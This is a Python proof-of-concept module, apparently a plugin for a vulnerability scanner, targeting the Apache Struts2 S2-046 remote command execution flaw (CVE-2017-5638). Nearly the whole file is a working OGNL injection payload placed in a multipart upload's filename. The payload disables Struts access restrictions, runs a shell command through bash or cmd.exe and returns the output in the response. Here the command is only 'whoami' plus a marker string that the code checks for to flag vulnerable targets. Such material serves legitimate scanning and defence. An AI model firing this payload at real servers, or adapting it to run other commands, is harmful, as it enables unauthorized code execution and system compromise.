#!/usr/bin/env python
#coding:utf8

__author__ = 'xiaokong'

import sys
import requests
from module.log import logger



class poc(object):

    type = 'FRAME'
    querytype = 'site'
    description = 'Struts2-046 remote command execute(CVE-2017-5638)'
    
    def __init__(self, v):
        
        self.payload="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):\
                ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony\
                .xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context\
                .setMemberAccess(#dm)))).(#cmd='whoami&&echo 13923fd34fcv4200').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().\
                contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).\
                (#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream\
                ())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b"
        self.logger = logger(v)
        self.userAgent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.0)'
        
    def exploit(self, target):
        
        headers = {'User-Agent': self.userAgent}
        try:
            f= {'file':(self.payload, open("data/tmp.txt", 'r'), 'text/plain')}
            res = requests.post(target, files=f, headers=headers, timeout=30)
            if not res.ok:
                return True
            data = res.content
            if '13923fd34fcv4200' in data and "context.setMemberAccess" not in data:
                self.logger.log(41,str([target]))
        except Exception as e:
            self.logger.debug(str(e))
        
        
    
